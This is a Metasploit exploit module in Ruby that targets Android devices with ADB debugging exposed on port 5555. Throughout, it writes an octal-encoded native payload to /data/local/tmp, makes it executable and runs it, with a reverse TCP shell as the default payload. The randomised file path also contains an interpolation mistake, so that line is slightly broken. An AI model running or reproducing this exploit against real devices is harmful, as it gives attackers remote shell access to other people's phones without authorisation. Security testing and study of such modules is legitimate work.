##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex/proto/adb/client'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Android ADB Debug Mode Shell Access',
      'Description'    => %q{
        Writes and spawns a native shell on an android device that is listening
        for adb debug messages.
      },
      'Author'         => ['joev'],
      'License'        => MSF_LICENSE,
      'DefaultOptions' => { 'PAYLOAD' => 'linux/armle/reverse_tcp' },
      'Platform'       => 'linux',
      'Arch'           => ARCH_ALL,
      'Targets'        => [ ['Automatic', {}] ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Jan 01 2016'
    ))

    register_options([
      Opt::RPORT(5555)
    ], self.class)
  end

  def check
    begin
      connect
      adb_client.connect
      return Exploit::CheckCode::Vulnerable
    ensure
      disconnect
    end

    Exploit::CheckCode::Unknown
  end

  def exploit
    begin
      connect
      # The octal syntax with the -e flag seems to be consistent across android distributions
      payload_octal = Rex::Text.to_octal(payload.encoded_exe, '\\\\0')
      cmd = "echo -e #{payload_octal} > #{bin_path}; chmod 700 #{bin_path}; #{bin_path} &"
      adb_client.connect
      response = adb_client.exec_cmd(cmd)
      print_good "Payload executed, response:\n #{response}"
    ensure
      disconnect
    end
  end

  def bin_path
    @bin ||= "/data/local/tmp/{Rex::Text.rand_text_alpha(8)}"
  end

  def adb_client
    @adb_client ||= Rex::Proto::ADB::Client.new(sock)
  end

end
